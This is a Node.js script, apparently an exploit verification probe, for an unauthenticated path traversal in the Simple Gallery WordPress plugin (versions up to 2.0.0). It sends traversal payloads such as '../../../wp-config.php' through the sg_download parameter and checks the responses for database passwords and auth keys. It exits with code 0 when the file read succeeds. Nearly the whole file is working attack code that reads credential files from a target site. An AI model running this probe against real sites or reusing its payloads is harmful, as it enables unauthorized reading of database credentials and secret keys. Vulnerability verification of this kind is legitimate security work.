#!/usr/bin/env node
// probe.mjs - exploit verification probe for Simple Gallery <= 2.0.0
// Unauthenticated Path Traversal to Arbitrary File Read via sg_download param.
//
// Usage: node probe.mjs <base-url>
// Exit code 0: target IS exploitable (vulnerable)
// Exit code 1: target is NOT exploitable (appears fixed / not vulnerable)

const baseUrl = process.argv[2];

if (!baseUrl) {
  console.error('Usage: node probe.mjs <base-url>');
  process.exit(1);
}

let origin;
try {
  origin = new URL(baseUrl).origin;
} catch (e) {
  console.error('Invalid base URL:', baseUrl);
  process.exit(1);
}

// Signatures that indicate we successfully read wp-config.php contents.
const SIGNATURES = [
  'DB_PASSWORD',
  'DB_NAME',
  'AUTH_KEY',
  "define('DB_NAME'",
  'define("DB_NAME"',
];

// A few traversal depths, in case the gallery dir depth differs between
// environments (uploads/simple-gallery/ is typically 2 levels under the
// WordPress root, but try a small range to be robust).
const traversalPaths = [
  '../../../wp-config.php',
  '../../../../wp-config.php',
  '../../wp-config.php',
  '../../../../../wp-config.php',
];

async function fetchPath(qs) {
  const url = `${origin}/?sg_download=${qs}`;
  try {
    const res = await fetch(url, { method: 'GET', redirect: 'manual' });
    const text = await res.text();
    return { status: res.status, text };
  } catch (e) {
    return { status: 0, text: '' };
  }
}

async function main() {
  let exploitable = false;

  for (const p of traversalPaths) {
    const { status, text } = await fetchPath(encodeURIComponent(p).replace(/%2F/gi, '/'));
    if (status === 200 && SIGNATURES.some((sig) => text.includes(sig))) {
      exploitable = true;
      console.error(`[+] Path traversal confirmed using sg_download=${p}`);
      console.error('[+] Leaked wp-config.php contents detected (DB credentials / auth keys present).');
      break;
    }
  }

  if (!exploitable) {
    // Also try a direct, unencoded traversal (some setups behave differently
    // with raw vs encoded slashes/dots).
    for (const p of traversalPaths) {
      const { status, text } = await fetchPath(p);
      if (status === 200 && SIGNATURES.some((sig) => text.includes(sig))) {
        exploitable = true;
        console.error(`[+] Path traversal confirmed using sg_download=${p}`);
        break;
      }
    }
  }

  // Nothing to clean up server-side: this probe only performs a read-only
  // GET request. No state on the target was changed, so there's nothing to
  // restore.

  if (exploitable) {
    console.error('[+] Target is VULNERABLE (unauthenticated arbitrary file read via sg_download).');
    process.exit(0);
  } else {
    console.error('[-] Target does NOT appear vulnerable (traversal blocked / file not readable).');
    process.exit(1);
  }
}

main().catch((e) => {
  console.error('Probe error:', e);
  process.exit(1);
});
